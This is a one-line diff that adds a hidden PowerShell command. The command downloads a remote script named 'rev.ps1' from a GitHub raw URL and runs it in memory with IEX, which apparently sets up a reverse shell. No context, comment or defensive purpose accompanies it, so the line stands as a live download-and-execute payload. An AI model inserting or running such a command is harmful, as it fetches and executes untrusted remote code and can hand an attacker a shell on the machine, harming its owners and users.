@@ -1,0 +1,1 @@
+powershell -nop -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Shivangx01b/test/main/rev.ps1')"
